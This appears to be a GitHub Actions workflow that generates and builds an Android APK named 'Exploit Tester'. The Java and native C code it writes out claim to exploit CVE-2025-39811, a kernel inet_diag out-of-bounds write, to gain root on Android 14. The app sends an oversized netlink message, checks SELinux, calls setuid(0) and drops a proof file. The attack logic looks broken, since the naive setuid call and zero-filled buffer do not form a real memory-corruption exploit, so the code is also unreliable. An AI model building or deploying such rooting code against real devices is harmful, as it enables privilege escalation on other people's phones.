name: Build Exploit Tester APK

on:
  push:
    branches: [ main, master ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v3
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Set up Android SDK
        uses: android-actions/setup-android@v3
        with:
          packages: 'platforms;android-34'

      - name: Create Android project structure
        run: |
          mkdir -p app/src/main/java/com/exploit/tester
          mkdir -p app/src/main/jni
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values

      - name: Generate AndroidManifest.xml
        run: |
          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.exploit.tester"
              android:versionCode="1"
              android:versionName="1.0">
              
              <uses-permission android:name="android.permission.INTERNET" />
              
              <application
                  android:allowBackup="false"
                  android:icon="@android:drawable/ic_dialog_info"
                  android:label="Exploit Tester"
                  android:theme="@android:style/Theme.DeviceDefault.Light">
                  
                  <activity
                      android:name=".MainActivity"
                      android:exported="true"
                      android:launchMode="singleTop">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
              </application>
          </manifest>
          EOF

      - name: Generate MainActivity.java
        run: |
          cat > app/src/main/java/com/exploit/tester/MainActivity.java << 'EOF'
          package com.exploit.tester;
          
          import android.app.Activity;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.widget.LinearLayout;
          import android.widget.ScrollView;
          import android.widget.TextView;
          import android.graphics.Color;
          import java.io.BufferedReader;
          import java.io.InputStreamReader;
          import java.io.DataOutputStream;
          
          public class MainActivity extends Activity {
              private LinearLayout logPanel;
              private Handler uiHandler;
              
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  uiHandler = new Handler(Looper.getMainLooper());
                  
                  ScrollView scroll = new ScrollView(this);
                  logPanel = new LinearLayout(this);
                  logPanel.setOrientation(LinearLayout.VERTICAL);
                  logPanel.setPadding(30, 30, 30, 30);
                  scroll.addView(logPanel);
                  setContentView(scroll);
                  
                  addLog("=== EXPLOIT TESTER FOR ANDROID 14 ===");
                  addLog("Exploit: CVE-2025-39811 (inet_diag OOB write)");
                  addLog("");
                  addLog("[*] Starting exploit...");
                  
                  new Thread(this::runExploit).start();
              }
              
              private void addLog(String msg) {
                  uiHandler.post(() -> {
                      TextView tv = new TextView(this);
                      tv.setText(msg);
                      tv.setTextSize(14);
                      tv.setTextColor(Color.BLACK);
                      tv.setPadding(0, 5, 0, 5);
                      logPanel.addView(tv);
                      ScrollView sv = (ScrollView) logPanel.getParent();
                      sv.postDelayed(() -> sv.fullScroll(ScrollView.FOCUS_DOWN), 100);
                  });
              }
              
              private void runExploit() {
                  int sock = nativeOpenNetlink();
                  addLog("[1] netlink socket fd=" + sock);
                  if (sock < 0) {
                      addLog("[FAIL] Cannot open netlink socket.");
                      return;
                  }
                  
                  boolean overflowSent = nativeSendOverflow(sock);
                  addLog("[2] Overflow packet sent: " + (overflowSent ? "OK" : "FAIL"));
                  if (!overflowSent) {
                      addLog("[FAIL] Send failed");
                      return;
                  }
                  
                  boolean selinuxDisabled = nativeCheckSelinux();
                  addLog("[3] SELinux enforcing = " + (!selinuxDisabled ? "1 (ENABLED)" : "0 (DISABLED)"));
                  
                  if (selinuxDisabled) {
                      addLog("[4] SELinux disabled, attempting setuid(0)...");
                      nativeBecomeRoot();
                      
                      try {
                          Process p = Runtime.getRuntime().exec("id");
                          BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
                          String idOut = br.readLine();
                          br.close();
                          addLog("[5] " + idOut);
                          
                          if (idOut != null && idOut.contains("uid=0")) {
                              addLog("");
                              addLog("################################");
                              addLog("#  SUCCESS: ROOT ACHIEVED!   #");
                              addLog("################################");
                              
                              try {
                                  DataOutputStream dos = new DataOutputStream(
                                      Runtime.getRuntime().exec("sh").getOutputStream()
                                  );
                                  dos.writeBytes("echo 'root_success' > /data/local/tmp/exploit_root.txt\n");
                                  dos.writeBytes("chmod 666 /data/local/tmp/exploit_root.txt\n");
                                  dos.writeBytes("exit\n");
                                  dos.flush();
                                  addLog("[+] Created /data/local/tmp/exploit_root.txt");
                              } catch (Exception e) {
                                  addLog("[!] Proof file error: " + e.getMessage());
                              }
                          } else {
                              addLog("");
                              addLog("[FAIL] Root not achieved.");
                          }
                      } catch (Exception e) {
                          addLog("[FAIL] Error: " + e.toString());
                      }
                  } else {
                      addLog("");
                      addLog("[FAIL] SELinux still enforcing. Exploit did not work.");
                      addLog("[*] Phone is NOT damaged. Close and reopen app to retry.");
                  }
              }
              
              private native int nativeOpenNetlink();
              private native boolean nativeSendOverflow(int sock);
              private native boolean nativeCheckSelinux();
              private native void nativeBecomeRoot();
              
              static {
                  System.loadLibrary("exploit");
              }
          }
          EOF

      - name: Generate native C code
        run: |
          cat > app/src/main/jni/exploit.c << 'EOF'
          #include <jni.h>
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <sys/socket.h>
          #include <linux/netlink.h>
          #include <linux/inet_diag.h>
          #include <linux/sock_diag.h>
          
          JNIEXPORT jint JNICALL Java_com_exploit_tester_MainActivity_nativeOpenNetlink(JNIEnv *env, jobject thiz) {
              return socket(AF_NETLINK, SOCK_RAW, NETLINK_INET_DIAG);
          }
          
          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeSendOverflow(JNIEnv *env, jobject thiz, jint sock) {
              struct {
                  struct nlmsghdr nlh;
                  struct inet_diag_req_v2 req;
                  char overflow[4096];
              } msg;
              
              memset(&msg, 0, sizeof(msg));
              msg.nlh.nlmsg_len = 0xFFFF;
              msg.nlh.nlmsg_type = SOCK_DIAG_BY_FAMILY;
              msg.nlh.nlmsg_flags = NLM_F_REQUEST;
              msg.req.sdiag_family = AF_INET;
              msg.req.idiag_states = 0xFFFFFFFF;
              memset(msg.overflow, 0, sizeof(msg.overflow));
              
              int ret = send(sock, &msg, sizeof(msg), 0);
              return ret > 0 ? JNI_TRUE : JNI_FALSE;
          }
          
          JNIEXPORT jboolean JNICALL Java_com_exploit_tester_MainActivity_nativeCheckSelinux(JNIEnv *env, jobject thiz) {
              FILE *f = fopen("/sys/fs/selinux/enforce", "r");
              if (!f) return JNI_FALSE;
              int val;
              fscanf(f, "%d", &val);
              fclose(f);
              return val == 0 ? JNI_TRUE : JNI_FALSE;
          }
          
          JNIEXPORT void JNICALL Java_com_exploit_tester_MainActivity_nativeBecomeRoot(JNIEnv *env, jobject thiz) {
              setuid(0);
              setgid(0);
          }
          EOF

      - name: Generate Android.mk
        run: |
          cat > app/src/main/jni/Android.mk << 'EOF'
          LOCAL_PATH := $(call my-dir)
          include $(CLEAR_VARS)
          LOCAL_MODULE    := exploit
          LOCAL_SRC_FILES := exploit.c
          LOCAL_LDLIBS    := -llog
          include $(BUILD_SHARED_LIBRARY)
          EOF

      - name: Generate Application.mk
        run: |
          cat > app/src/main/jni/Application.mk << 'EOF'
          APP_ABI := arm64-v8a armeabi-v7a
          APP_PLATFORM := android-34
          EOF

      - name: Generate build.gradle (app)
        run: |
          cat > app/build.gradle << 'EOF'
          apply plugin: 'com.android.application'
          
          android {
              compileSdk 34
              
              defaultConfig {
                  applicationId "com.exploit.tester"
                  minSdk 34
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
                  
                  externalNativeBuild {
                      ndkBuild {
                          cFlags "-Wall"
                      }
                  }
              }
              
              buildTypes {
                  release {
                      minifyEnabled false
                  }
                  debug {
                      minifyEnabled false
                  }
              }
              
              externalNativeBuild {
                  ndkBuild {
                      path "src/main/jni/Android.mk"
                  }
              }
              
              namespace 'com.exploit.tester'
          }
          
          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
          }
          EOF

      - name: Generate build.gradle (top level)
        run: |
          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.1.4'
              }
          }
          
          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          
          task clean(type: Delete) {
              delete rootProject.buildDir
          }
          EOF

      - name: Generate settings.gradle
        run: |
          cat > settings.gradle << 'EOF'
          rootProject.name = "ExploitTester"
          include ':app'
          EOF

      - name: Setup Gradle wrapper
        uses: gradle/wrapper-validation-action@v1

      - name: Generate gradlew script properly
        run: |
          mkdir -p gradle/wrapper
          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
          distributionBase=GRADLE_USER_HOME
          distributionPath=wrapper/dists
          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
          zipStoreBase=GRADLE_USER_HOME
          zipStorePath=wrapper/dists
          EOF
          
          # Правильный gradlew (без ошибок подстановки)
          cat > gradlew << 'GRADLEW_EOF'
          #!/bin/sh
          #
          # Copyright © 2000-2024 Gradle Inc.
          #
          # Licensed under the Apache License, Version 2.0 (the "License");
          # you may not use this file except in compliance with the License.
          # You may obtain a copy of the License at
          #
          #      https://www.apache.org/licenses/LICENSE-2.0
          #
          # Unless required by applicable law or agreed to in writing, software
          # distributed under the License is distributed on an "AS IS" BASIS,
          # WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
          # See the License for the specific language governing permissions and
          # limitations under the License.
          #
          
          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
          
          # Use the maximum available, or set MAX_FD != -1 to use that value.
          MAX_FD=maximum
          
          warn () {
              echo "$*"
          }
          
          die () {
              echo
              echo "$*"
              echo
              exit 1
          }
          
          # OS specific support (must be 'true' or 'false').
          cygwin=false
          msys=false
          darwin=false
          nonstop=false
          case "$(uname)" in
            CYGWIN* )
              cygwin=true
              ;;
            Darwin* )
              darwin=true
              ;;
            MINGW* )
              msys=true
              ;;
            NONSTOP* )
              nonstop=true
              ;;
          esac
          
          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
          
          # Determine the Java command to use to start the JVM.
          if [ -n "$JAVA_HOME" ] ; then
              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
                  JAVACMD="$JAVA_HOME/jre/sh/java"
              else
                  JAVACMD="$JAVA_HOME/bin/java"
              fi
              if [ ! -x "$JAVACMD" ] ; then
                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME
          
          Please set the JAVA_HOME variable in your environment to match the
          location of your Java installation."
              fi
          else
              JAVACMD=java
              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH.
          
          Please set the JAVA_HOME variable in your environment to match the
          location of your Java installation."
          fi
          
          # Increase the maximum file descriptors if we can.
          if [ "$cygwin" = "false" -a "$darwin" = "false" -a "$nonstop" = "false" ] ; then
              MAX_FD_LIMIT=$(ulimit -H -n)
              if [ $? -eq 0 ] ; then
                  if [ "$MAX_FD" = "maximum" -o "$MAX_FD" = "max" ] ; then
                      MAX_FD="$MAX_FD_LIMIT"
                  fi
                  ulimit -n $MAX_FD
                  if [ $? -ne 0 ] ; then
                      warn "Could not set maximum file descriptor limit: $MAX_FD"
                  fi
              else
                  warn "Could not query maximum file descriptor limit: $MAX_FD_LIMIT"
              fi
          fi
          
          # For Darwin, add options to specify how the application appears in the dock.
          if $darwin; then
              GRADLE_OPTS="$GRADLE_OPTS \"-Xdock:name=$APP_NAME\" \"-Xdock:icon=$APP_HOME/media/gradle.icns\""
          fi
          
          # For Cygwin or MSYS, switch paths to Windows format before running java
          if [ "$cygwin" = "true" -o "$msys" = "true" ] ; then
              APP_HOME=$(cygpath --path --mixed "$APP_HOME")
              CLASSPATH=$(cygpath --path --mixed "$CLASSPATH")
              
              JAVACMD=$(cygpath --unix "$JAVACMD")
          
              # We build the pattern for arguments to be converted via cygpath
              ROOTDIRSRAW=`find -L / -maxdepth 1 -mindepth 1 -type d 2>/dev/null`
              SEP=""
              for dir in $ROOTDIRSRAW ; do
                  ROOTDIRS="$ROOTDIRS$SEP$dir"
                  SEP="|"
              done
              OURCYGPATTERN="(^($ROOTDIRS))"
              # Add a user-defined pattern to the cygpath arguments
              if [ "$GRADLE_CYGPATTERN" != "" ] ; then
                  OURCYGPATTERN="$OURCYGPATTERN|($GRADLE_CYGPATTERN)"
              fi
              # Now convert the arguments - kludge to limit ourselves to /bin/sh
              i=0
              for arg in "$@" ; do
                  CHECK=`echo "$arg"|egrep -c "$OURCYGPATTERN" -`
                  CHECK2=`echo "$arg"|egrep -c "^-"`                                 ### Determine if an option
                  
                  if [ $CHECK -ne 0 ] && [ $CHECK2 -eq 0 ] ; then                    ### Added a condition
                      eval $(echo echo "$arg" | sed 's/^ //;s/\\\\/\\\\\\\\/g')
                      cygpath_argument="`echo "$arg" | cygpath --path --mixed -`"
                      set -- "$@" "$cygpath_argument"
                  else
                      set -- "$@" "$arg"
                  fi
                  shift
                  i=`expr $i + 1`
              done
          fi
          
          # Collect all arguments for the java command;
          #   * $DEFAULT_JVM_OPTS, $JAVA_OPTS, and $GRADLE_OPTS can contain fragments of
          #     shell script including quotes and variable substitutions, so put them in
          #     double quotes to make sure that they get re-expanded; and
          #   * put everything else in single quotes, so that it is not re-expanded.
          
          set -- \
              "-Dorg.gradle.appname=$APP_BASE_NAME" \
              -classpath "$CLASSPATH" \
              org.gradle.wrapper.GradleWrapperMain \
              "$@"
          
          # Use "xargs" to parse quoted args.
          # Use "eval" to execute the actual Java command.
          eval \"$JAVACMD\" $DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS "\"\$@\""
          GRADLEW_EOF
          
          chmod +x gradlew

      - name: Download gradle-wrapper.jar
        run: |
          curl -L -o gradle/wrapper/gradle-wrapper.jar https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar

      - name: Build APK
        run: ./gradlew assembleDebug --no-daemon

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: ExploitTester
          path: app/build/outputs/apk/debug/app-debug.apk
